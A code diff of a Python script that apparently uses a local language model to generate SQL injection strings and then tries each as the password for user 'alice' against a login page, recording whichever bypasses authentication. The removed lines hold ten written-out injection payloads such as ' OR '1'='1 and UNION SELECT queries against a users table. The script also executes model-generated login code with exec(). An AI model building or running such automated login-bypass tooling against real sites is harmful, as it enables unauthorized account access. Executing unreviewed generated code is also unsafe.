@@ -86,33 +86,6 @@ def run_text_prompt(prompt: str, model: str = "gpt-oss:20b"):
     # Grab first START_CODE ... END_CODE block only
     return extract_first_code_block(raw)
 
-# def login(username: str, password: str) -> requests.Session | None:
-#     """
-#     Try to log in and return an authenticated session if successful.
-#     Otherwise return None.
-#     """
-#     session = requests.Session()
-
-#     # Step 1: grab CSRF token
-#     login_page = session.get(f"{BASE_URL}/login")
-#     soup = BeautifulSoup(login_page.text, "html.parser")
-#     csrf_input = soup.find("input", {"name": "csrf_token"})
-#     if not csrf_input:
-#         return None
-#     csrf_token = csrf_input["value"]
-
-#     # Step 2: post credentials
-#     payload = {
-#         "csrf_token": csrf_token,
-#         "username": username,
-#         "password": password,
-#     }
-#     resp = session.post(f"{BASE_URL}/login", data=payload)
-
-#     # Step 3: check login success
-#     if "Logout" in resp.text or resp.url != f"{BASE_URL}/login":
-#         return session  # success
-#     return None
 
 if __name__ == "__main__":
     prompt = """
@@ -146,69 +119,13 @@ if __name__ == "__main__":
     - 10 items total
     - Output ONLY valid JSON, no extra text.
     """
-    # answer = run_json_prompt(prompt)
+    answer = run_json_prompt(prompt)
 
-    # try:
-    #     validated = ResponseModel.model_validate(answer)
-    #     print(validated.model_dump_json(indent=2))
-    # except ValidationError as e:
-    #     print("❌ Validation failed:", e)
-
-    validated = ResponseModel.model_validate({
-        "examples": [
-            {
-            "username": "alice",
-            "password": "' OR '1'='1"
-            },
-            {
-            "username": "alice",
-            "password": "' UNION SELECT NULL, username, password FROM users--"
-            },
-            {
-            "username": "alice",
-            "password": "' OR 1=1 --"
-            },
-            {
-            "username": "alice",
-            "password": "' AND (SELECT COUNT(*) FROM users)=0 --"
-            },
-            {
-            "username": "alice",
-            "password": "' OR EXISTS(SELECT 1 FROM users WHERE username='admin' AND password='pass')--"
-            },
-            {
-            "username": "alice",
-            "password": "' OR 'a'='a' --"
-            },
-            {
-            "username": "alice",
-            "password": "' UNION SELECT null, null, 'admin'--"
-            },
-            {
-            "username": "alice",
-            "password": "' OR 1=1#"
-            },
-            {
-            "username": "alice",
-            "password": "' OR 1=1 LIMIT 1 OFFSET 0#"
-            },
-            {
-            "username": "alice",
-            "password": "' OR 1=1 ORDER BY 1--"
-            }
-        ]
-    })
-
-
-
-    #Step 2 try all prompts until you login
-    # for example in validated.examples:
-    #     print(f"Trying password: {example.password}")
-    #     session = login("alice", example.password)
-    #     if session:
-    #         print(f"✅ Login success with password: {example.password}")
-    #         break
-
+    try:
+        validated = ResponseModel.model_validate(answer)
+        print(validated.model_dump_json(indent=2))
+    except ValidationError as e:
+        print("❌ Validation failed:", e)
 
 
     login_prompt = f"""
@@ -239,10 +156,12 @@ if __name__ == "__main__":
     exec(code_str, ns)
     login_fn = ns["login"]
 
+    sql_injection_pass = None
     for example in validated.examples:
         print(f"Trying password: {example.password}")
         session = login_fn("alice", example.password)
         if session:
+            sql_injection_pass = example.password
             print(f"✅ Login success with password: {example.password}")
             break
 
